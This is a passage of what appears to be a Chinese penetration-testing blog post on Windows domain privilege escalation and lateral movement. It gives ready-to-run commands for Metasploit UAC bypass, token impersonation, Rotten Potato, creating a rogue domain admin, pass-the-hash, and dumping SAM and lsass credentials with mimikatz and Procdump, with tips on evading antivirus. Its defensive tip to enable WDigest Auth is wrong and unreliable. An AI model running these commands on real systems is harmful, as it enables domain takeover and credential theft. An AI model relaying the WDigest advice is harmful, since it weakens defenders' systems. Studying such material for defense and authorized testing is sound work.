-</ul>
-<p>管理员在域中更新一个组策略以后，操作系统会自动在SYSVOL共享目录中生成一个xml文件，该文件保存了该组策略更新后的密码，使用了AES-256加密算法，但是由于微软在2012年公开了该密码的密钥，导致密码的安全性降低</p>
-<p>我们可以直接找到包含cpassword的xml文件,对密文进行解密</p>
-<p>防御方法:</p>
-<ul>
-<li>安装KB2962486补丁</li>
-<li>设置共享文件夹Everyone的访问权限</li>
-<li>把包含组策略密码的Xml文件中SYSVOL的目录中删除</li>
-<li>不要把密码放在所有域用户都有权访问的文件中</li>
-<li>如果需要更改域中机器的本地管理员密码，建议使用LAPS</li>
-</ul>
-<h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><p>计算机的操作系统版本大于Windows Vista或更高，在权限不够的情况下， 访问系统磁盘的根目录，Windows目录，Program Files目录，以及读，写系统登录数据库的程序等操作，需要经过UAC(User Account Control)的认证</p>
-<p>UAC有四种设置要求，始终通知，仅在程序视图更改我的计算机时通知，仅在程序视图更改我的计算机时候通知我(不降低桌面亮度)，从不提示</p>
-<p>仅在程序视图更改我的计算机时通知是默认情况</p>
-<p>假设我们经过前提的渗透测试已经获得到了目标的meterpreter的shell，当前权限为普通用户，如果我们尝试获取系统的System权限，可以先运行exploit/windows/local/bypassuac模块，然后执行getsystem(在使用这个模块的时候当前用户必须在管理员组中，UAC必须为默认设置)</p>
-<p>也可以使用RunAs模块，使用exploit/windows/local/ask模块，在弹出的uac对话框中选择是，即可，要求是当前用户在管理员组或知道管理员的密码，对UAC无要求，需要使用EXE::Custom选项创建一个可执行文件，需要进行免杀处理</p>
-<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>令牌是系统中的临时密钥，相当于账号和密码，有了令牌就可以在不提供密码或者其他凭证的情况下访问网络和系统资源，他的特地是随机性和不可预测性，访问令牌(Access Token)代表访问控制操作主体的系统对象，密保令牌(Security Token)叫认证令牌或者硬件令牌，是一种实现计算机身份校验的物理设备，比如U盾，会话令牌(Session Token)是交互会话中唯一的身份标识符</p>
-<p>伪造令牌的核心是kerberos协议，首先是客户端向服务端请求证书，认证服务器收到请求，把包含密钥的加密证书给客户端，该证书包含了服务器Ticket和一个临时加密密钥，也会向服务器发送一份证书，使服务器可以验证客户端身份，客户端把Ticket给服务器，如果服务器确认客户端身份，就允许登录，客户端登录服务器以后，攻击者就可以通过入侵服务器来窃取客户端的令牌</p>
-<p>假设获取到了目标机器的meterpreter shell，首先输入 <code>user incognito</code>,然后输入 <code>list_tokens -u</code>,列出可用的令牌，有两种类型的令牌，一种是Delegation Tokens，就是授权令牌，支持交互式登录，另外一种是Impersonation Tokens，也就是模拟令牌，支持非交互式的会话，令牌数量取决于meterpreter shell的访问级别，然后调用impersonate_token就可以假冒用户了，比如<code>impersonate_token WIN-xxx//Administrator</code></p>
-<h3 id="Rotten-Potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a>Rotten Potato</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">把rottenpotato.exe上传到目标服务器</span><br><span class="line">execute -HC -f rottenpotato.exe</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
-
-<h3 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h3><p>拿到meterpreter shell以后输入ps，找到域管理进程，使用migrate 迁移到这个进程，输入shell进入控制行界面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user ch1e ch1esec /ad /domain     添加域用户</span><br><span class="line">net group &quot;domain admins&quot; ch1e /ad /domain	  添加到域管理员组</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
-
-<p>同样，在meterpreter中可以使用incognito来模拟域管理员，通过迭代系统中所有可用的身份验证令牌来添加域管理员</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在活动的meterpreter中执行如下命令， 在域控主机上添加一个账号</span><br><span class="line">add_user ch1e ch1esec -h 1.1.1.2</span><br><span class="line">执行如下命令，把账户添加到管理员组中</span><br><span class="line">add_group_user &quot;Domain Admins&quot; ch1e -h 1.1.1.2</span><br></pre></td></tr></table></figure>
-
-<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="IPC-Internet-Process-Connection"><a href="#IPC-Internet-Process-Connection" class="headerlink" title="IPC(Internet Process Connection)"></a>IPC(Internet Process Connection)</h2><p>通过$IPC，可以与目标机器建立连接，可以访问目标机器的文件，进行上传和下载操作，还可以运行其他命令</p>
-<p>首先需要建立一个IPC连接，<code>net use \\IP\ipc$ &quot;密码&quot; /user:&quot;administrator&quot;</code>，可以使用<code>net use</code> 查看已经建立的连接</p>
-<p>利用条件:开启了139，445端口，通过139，445端口，可以实现对共享文件/打印机的访问，并且管理员需要开启默认共享</p>
-<h2 id="PTH-Pass-The-Hash"><a href="#PTH-Pass-The-Hash" class="headerlink" title="PTH(Pass The Hash)"></a>PTH(Pass The Hash)</h2><p>拿到某个机子的NTLM hash，就可以拿这个NTLM进行远程登录，原理其实是Windows内部不保存明文密码，只保存密码的hash值，本机用户的密码hash是放在<code>%SystemRoot%\System32\config\SAM</code>里，域内用户的密码存放在域控的<code>C:\Windows\NTDS\NTDS.dit</code>文件里，在使用CS时常见到以下情况的hash</p>
-<p><code>Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</code></p>
-<p>windows中hash结构一般为<code>username:RID:LM-hsah:NTLM-hash</code>，AAD3B435B51404EEAAD3B435B51404EE是LM Hash，31D6CFE0D16AE931B73C59D7E0C089C0是NTLM Hash这里的话LM加密算法不进行介绍，只在2000 XP 2003系统中有，从Windows Vista 和 Windows Server 2008开始默认只存储NTLM Hash，如果密码是空或者不存储LM Hash的话，这里的LM Hash都是AAD3B435B51404EEAAD3B435B51404EE，NTLM的算法如下</p>
-<ul>
-<li>先把用户名密码转换成16进制</li>
-<li>把16进制格式的密码进行Unicode编码</li>
-<li>使用MD4对Unicode编码数据进行Hash计算</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/ch0x01e/image/main/img/image-20220313220800398.png" alt="image-20220313220800398"></p>
-<p>这里标注了大概过程</p>
-<ol>
-<li>用户登录客户端电脑</li>
-<li>客户端向服务器发送协商消息，包含客户端支持和服务器请求的功能列表</li>
-<li>服务器用质询进行响应，包含服务器支持和同意的功能列表，最主要包含服务器产生的Challenge</li>
-<li>客户端用身份验证回复质询，用户接受到3中的challenge后，用用户与challenge进行加密运算得到response，把response，username，challenge，发给服务器，response是关键，他向服务器证明客户端用户知道账号密码</li>
-<li>服务器拿到身份验证后，用challenge和hash进行加密得到response2与身份验证发来的response进行比较，如果用户hash在域控里，如果没有用户hash，没法计算response2，这个时候服务器会使用netlogon协议，联系域控，建立一个安全通道，把协商，质询，身份证验证全发给域控，这个过程叫Pass Through Authentication认证流程</li>
-<li>域控使用challenge和用户hash加密得到response2，与response比较</li>
-</ol>
-<p>这里就可能存在一个安全问题，由于在计算response的时候，客户端是使用的用户的hash进行计算，而不是用户密码，所以我们只需要用户hash即可登录</p>
-<h2 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h2><p>想要抓取明文或者哈希密码，必须要提权至System，本地用户名，哈希值和安全验证信息都存在SAM中，lsass.exe进程是实现Windows的安全策略(本地安全策略和登录策略) 我们可以使用工具把散列值和明文密码从内存中的lsass.exe进程或者SAM文件导出</p>
-<h3 id="通过SAM和System文件抓取密码"><a href="#通过SAM和System文件抓取密码" class="headerlink" title="通过SAM和System文件抓取密码"></a>通过SAM和System文件抓取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">无工具导出SAM文件</span><br><span class="line">	reg save hklm\sam sam.hive</span><br><span class="line">	reg save hklm\system system.hive</span><br><span class="line">	方法一:把从目标系统到处的system.hive和sam.hive与mimikatz放在同一目录下，运行mimikatz</span><br><span class="line">		lsadump::sam/sam:sam.hive /system:system.hive</span><br><span class="line">	方法二:使用mimikatz直接读取本地SAM文件，到处hash信息（需要免杀）</span><br><span class="line">		打开mimikatz</span><br><span class="line">		privilege::debug   //提升权限</span><br><span class="line">		token::elevate   //把权限提升至system</span><br><span class="line">		lsadump::sam     //读取本地SAM文件，获得NTLM Hash</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用mimikatz在线读取SAM文件"><a href="#使用mimikatz在线读取SAM文件" class="headerlink" title="使用mimikatz在线读取SAM文件"></a>使用mimikatz在线读取SAM文件</h3><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
-<h3 id="使用mimikatz离线读取lsass-dmp文件"><a href="#使用mimikatz离线读取lsass-dmp文件" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件"></a>使用mimikatz离线读取lsass.dmp文件</h3><p>Procdump是微软的工具，可以在命令行下把lsass文件导出，杀软不会报毒</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用Procdump导出lsass.dmp文件</span><br><span class="line">	Procdump.exe -accepteula -ma lsass.exe lsass.dump</span><br><span class="line">使用Procdump导出lsass.dmp文件中的密码散列值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>防御方法:开启Wdigest Auth</p>
-<h2 id="PTT-Pass-The-Ticket"><a href="#PTT-Pass-The-Ticket" class="headerlink" title="PTT(Pass The Ticket)"></a>PTT(Pass The Ticket)</h2><h3 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h3>
       
     </div>
 
